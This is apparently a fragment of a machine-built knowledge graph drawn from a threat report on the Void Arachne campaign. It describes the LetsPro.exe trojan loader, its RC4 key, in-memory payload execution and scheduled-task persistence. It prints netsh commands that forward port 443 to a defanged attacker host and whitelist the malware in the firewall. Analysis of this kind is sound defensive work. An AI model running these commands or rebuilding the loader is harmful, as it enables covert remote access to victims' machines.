          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Memory Execution",
      "type": "Technique",
      "id": "technique--memory-execution",
      "description": "Technique where decrypted payload is mapped into the process's memory space and executed",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Payload Decryption Process",
      "type": "Procedure",
      "id": "procedure--payload-decryption",
      "description": "Decrypts the second-stage payload using RC4 algorithm with the key 0x678E0B00",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPro.exe",
      "type": "Tool",
      "id": "tool--letspro-exe",
      "description": "Trojan loader that decrypts, maps, and executes a second-stage payload in memory",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Service Execution",
      "type": "Technique",
      "id": "technique--service-execution",
      "description": "T1569.002: 通过服务执行恶意代码",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Persistence",
      "type": "Technique",
      "id": "technique--persistence",
      "description": "T1053: 通过计划任务实现持久化",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "VBScript Persistence Procedure",
      "type": "Procedure",
      "id": "procedure--vbscript-persistence",
      "description": "通过VBScript创建计划任务实现持久化的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "File Replication Procedure",
      "type": "Procedure",
      "id": "procedure--file-replication",
      "description": "复制加载器、VBScript和文件到用户目录的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Visual Basic Script",
      "type": "Tool",
      "id": "tool--vbscript",
      "description": "用于创建计划任务的VBScript脚本",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "User Directory",
      "type": "Asset",
      "id": "asset--user-directory",
      "description": "用户目录，用于存储恶意文件",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Windows Service Creation Procedure",
      "type": "Procedure",
      "id": "procedure--service-creation",
      "description": "创建Windows服务以执行VBScript的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 16,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
          "chunk_length": 765,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 141,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 16,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPRO.exe",
      "type": "Tool",
      "id": "tool--LetsPRO.exe",
      "description": "MD5: FE7AEDAB70A5A58EFB84E6CB988D67A4, Size: 40960",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "792258.vbs",
      "type": "Tool",
      "id": "tool--792258.vbs",
      "description": "MD5: CD95B5408531DC5342180A1BECE74757, Size: 2405",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "File 1",
      "type": "Tool",
      "id": "tool--file-1",
      "description": "MD5: D82362C15DDB7206010B8FCEC7F611C5, Size: 9996288",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 17,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
          "chunk_length": 513,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "table",
            "token_length": 153,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 17,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Firewall Rule Setup",
      "type": "Procedure",
      "id": "procedure--firewall-rule",
      "description": "设置防火墙规则的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "netsh",
      "type": "Tool",
      "id": "tool--netsh",
      "description": "网络配置工具",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "103.214.147.14[.]webcamcn[.]xyz",
      "type": "Asset",
      "id": "asset--destination-server",
      "description": "目标服务器",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos 4.0 Stager Execution",
      "type": "Procedure",
      "id": "procedure--winos-stager",
      "description": "执行Winos 4.0 stager的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
